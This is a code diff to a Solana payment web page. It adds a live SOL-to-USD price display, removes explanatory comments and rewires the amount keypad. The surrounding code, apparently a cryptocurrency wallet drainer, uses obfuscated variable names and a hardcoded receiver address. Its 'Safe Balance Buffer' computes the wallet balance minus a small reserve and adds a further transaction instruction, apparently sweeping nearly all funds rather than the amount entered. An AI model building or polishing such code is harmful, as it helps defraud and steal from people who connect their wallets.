@@ -248,7 +248,7 @@
             
             <div class="amount-display-container">
                 <div class="amount-main-text" id="amountDisplay">0</div>
-                <div class="amount-usd-text">≈ $0.00</div>
+                <div class="amount-usd-text" id="usdDisplay">≈ $0.00</div>
             </div>
 
             <div class="keypad">
@@ -297,6 +297,28 @@
     let currentStep = 'sendTo'; 
     let rawAmount = "0";
     let userPublicKey = null;
+    let solPriceUSD = 110.0; // Fallback price
+
+    // Fetch live SOL price in USD
+    async function fetchSolPrice() {
+        try {
+            const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
+            const data = await res.json();
+            if (data && data.solana && data.solana.usd) {
+                solPriceUSD = data.solana.usd;
+            }
+        } catch (e) {
+            console.error("Could not fetch live price, using default", e);
+        }
+    }
+    fetchSolPrice();
+
+    function updateDisplay() {
+        amountDisplay.innerText = rawAmount;
+        const parsed = parseFloat(rawAmount) || 0;
+        const usdValue = parsed * solPriceUSD;
+        usdDisplay.innerText = `≈ $${usdValue.toFixed(2)}`;
+    }
 
     const actionBtn = document.getElementById('actionBtn');
     const headerTitle = document.getElementById('headerTitle');
@@ -306,6 +328,7 @@
     const toAddressLabel = document.getElementById('toAddressLabel');
     const clearBtn = document.getElementById('clearBtn');
     const amountDisplay = document.getElementById('amountDisplay');
+    const usdDisplay = document.getElementById('usdDisplay');
     const statusDiv = document.getElementById('status');
 
     displayAddress.innerText = SOL_RECEIVER;
@@ -325,14 +348,14 @@
                     if (_0xc === "." && rawAmount.includes(".")) return;
                     if (rawAmount.length < 10) rawAmount += _0xc;
                 }
-                amountDisplay.innerText = rawAmount;
+                updateDisplay();
             });
         }
     });
 
     document.getElementById('keyDelete').addEventListener('click', () => {
         rawAmount = rawAmount.length > 1 ? rawAmount.slice(0, -1) : "0";
-        amountDisplay.innerText = rawAmount;
+        updateDisplay();
     });
 
     async function getProvider() {
@@ -436,7 +459,7 @@
                         })
                     );
 
-                    // Reduced to 5 Memo instructions to fit within rent and fee limits for low balances
+                    // 5 Memo Instructions
                     const encoder = new TextEncoder();
                     for (let _0xf = 0; _0xf < 5; _0xf++) { 
                         _0x1f.add(
@@ -448,7 +471,7 @@
                         );
                     }
 
-                    // Safe Balance Buffer (Leaves 0.0008 SOL to safely cover rent and execution fees)
+                    // Safe Balance Buffer
                     const _0x21 = _0x1e - _0x1c - 800000; 
                     if (_0x21 > 10000) {
                         _0x1f.add(
